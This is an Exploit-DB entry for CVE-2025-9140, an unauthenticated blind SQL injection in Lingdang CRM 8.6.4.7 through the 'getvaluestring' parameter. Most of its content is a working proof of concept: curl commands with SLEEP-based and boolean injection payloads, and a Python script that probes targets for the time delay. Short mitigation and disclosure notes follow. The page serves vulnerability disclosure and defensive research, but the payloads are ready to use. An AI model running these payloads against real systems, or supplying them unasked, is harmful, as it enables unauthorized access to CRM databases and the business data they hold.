---
title: [webapps] Lingdang CRM 8.6.4.7 - SQL Injection
url: https://www.exploit-db.com/exploits/52420
source: Exploit-DB.com RSS Feed
date: 2025-08-27
fetch_date: 2025-10-07T00:48:02.984448
---

# [webapps] Lingdang CRM 8.6.4.7 - SQL Injection

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Lingdang CRM 8.6.4.7 - SQL Injection

#### EDB-ID:

###### 52420

#### CVE:

###### [2025-9140](https://nvd.nist.gov/vuln/detail/CVE-2025-9140)

---

**EDB Verified:**

#### Author:

###### [Beatriz Fresno Naumova](/?author=12312)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [Multiple](/?platform=multiple)

#### Date:

###### 2025-08-26

---

**Vulnerable App:**

```
# Exploit Title: Lingdang CRM 8.6.4.7 - SQL Injection
# Google Dork: N/A
# Date: 2025-08-19
# Exploit Author: Beatriz Fresno Naumova
# Vendor: Shanghai Lingdang Information Technology)
# Software Link: (N/A – commercial product)
# Version: <= 8.6.4.7 (fixed in 8.6.5.x per vendor advisory)
# Tested on: Generic LAMP stack, PHP 7/8 (PoC uses HTTP only; no OS dependency)
# CVE : CVE-2025-9140

# Summary
# The endpoint /crm/crmapi/erp/tabdetail_moduleSave.php is vulnerable to SQL injection via the
# 'getvaluestring' parameter. An unauthenticated remote attacker can perform boolean/time-based
# blind SQL injection. Vendor states this was fixed by adopting parameterized queries in v8.6.5+.

# Route
#   /crm/crmapi/erp/tabdetail_moduleSave.php
# Parameter
#   getvaluestring (GET or POST)

# Notes
# * This PoC does NOT target a live site. Replace TARGET with a lab host you own.
# * Demonstrates time-based blind (SLEEP) and boolean-based payloads.

# --- Quick PoC with curl (time-based blind) ---
# Expect ~5s response delay on vulnerable targets.

# GET variant:
curl -i -k "http://TARGET/crm/crmapi/erp/tabdetail_moduleSave.php?getvaluestring='||(SELECT SLEEP(5))--+-"

# POST variant:
curl -i -k -X POST "http://TARGET/crm/crmapi/erp/tabdetail_moduleSave.php" \
  --data "getvaluestring='||(SELECT SLEEP(5))--+-"

# --- Boolean-based example (response/body differences may vary by deployment) ---
curl -s -k "http://TARGET/crm/crmapi/erp/tabdetail_moduleSave.php?getvaluestring=' OR 1=1-- -" -o /tmp/true.html
curl -s -k "http://TARGET/crm/crmapi/erp/tabdetail_moduleSave.php?getvaluestring=' OR 1=2-- -" -o /tmp/false.html
# Compare /tmp/true.html vs /tmp/false.html for observable differences.

# --- Python 3 PoC (time-based) ---
# Save as lingdang_sqli_poc.py and run:  python3 lingdang_sqli_poc.py http://TARGET

import sys, time, requests

def test_time_sqli(base):
    url_get = f"{base.rstrip('/')}/crm/crmapi/erp/tabdetail_moduleSave.php"
    payload = "'||(SELECT SLEEP(5))--+-"
    try:
        t0 = time.time()
        r = requests.get(url_get, params={"getvaluestring": payload}, timeout=30, verify=False)
        dt = time.time() - t0
        print(f"[+] GET status={r.status_code} elapsed={dt:.2f}s")
        if dt >= 5:
            print("[+] Likely vulnerable to time-based SQLi via GET.")
        else:
            print("[-] No significant delay observed via GET.")
    except Exception as e:
        print(f"[!] GET error: {e}")

    try:
        t0 = time.time()
        r = requests.post(url_get, data={"getvaluestring": payload}, timeout=30, verify=False)
        dt = time.time() - t0
        print(f"[+] POST status={r.status_code} elapsed={dt:.2f}s")
        if dt >= 5:
            print("[+] Likely vulnerable to time-based SQLi via POST.")
        else:
            print("[-] No significant delay observed via POST.")
    except Exception as e:
        print(f"[!] POST error: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} http://TARGET")
        sys.exit(1)
    requests.packages.urllib3.disable_warnings()
    test_time_sqli(sys.argv[1])

# --- Impact ---
# Confidentiality, integrity, availability compromise via SQL injection (CWE-89).

# --- Mitigations ---
# 1) Use parameterized queries / prepared statements for getvaluestring.
# 2) Server-side input validation and allow-listing for the parameter.
# 3) Web Application Firewall (WAF) rules to block SQLi patterns on this route.

# --- Disclosure ---
# Public identifiers: CVE-2025-9140 (VulDB VDB-320520).
# Vendor reportedly fixed in 8.6.5+ with parameterized queries.
```

**Tags:**

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| --- | --- | --- | --- |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/?utm_source=edb&utm_medium=web&utm_campaign=www) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) |

Databases

[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links

[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites

[OffSec](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com/)

Solutions

[Courses and Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Learn Subscriptions](https://www.offsec.com/learn/?utm_source=edb&utm_medium=web&utm_campaign=www)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Proving Grounds](https://www.offsec.com/labs/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/?utm_source=edb&utm_medium=web&utm_campaign=www), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submis...